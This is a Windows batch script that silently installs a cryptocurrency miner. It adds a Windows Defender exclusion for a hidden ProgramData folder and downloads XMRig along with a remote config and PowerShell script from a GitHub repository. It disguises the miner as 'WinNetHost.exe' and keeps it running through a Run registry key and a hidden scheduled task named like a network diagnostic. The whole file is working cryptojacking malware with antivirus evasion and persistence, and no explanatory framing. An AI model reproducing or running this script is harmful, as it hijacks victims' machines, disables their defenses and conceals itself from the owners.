@echo off
setlocal
set "D=C:\ProgramData\Microsoft\NetworkModules"
powershell -Command "Add-MpPreference -ExclusionPath '%D%'" 2>nul
if not exist "%D%" mkdir "%D%"
attrib +h +s "%D%"
cd /d "%D%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip' -OutFile 'sys.zip'"
powershell -Command "iwr -Uri 'https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/config.json' -OutFile 'config.json'"
powershell -Command "iwr -Uri 'https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/win_defender_check.ps1' -OutFile 'win_defender_check.ps1'"
powershell -Command "Expand-Archive -Path 'sys.zip' -DestinationPath '.' -Force"
for /r %%i in (xmrig.exe) do move "%%i" "WinNetHost.exe"
del /q sys.zip
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NetHostUpdate" /t REG_SZ /d "C:\ProgramData\Microsoft\NetworkModules\WinNetHost.exe --config=%D%\config.json" /f
schtasks /create /tn "WinNetDiagnostics" /tr "powershell.exe -WindowStyle Hidden -File %D%\win_defender_check.ps1" /sc minute /mo 10 /f
start /b WinNetHost.exe --config=config.json
exit
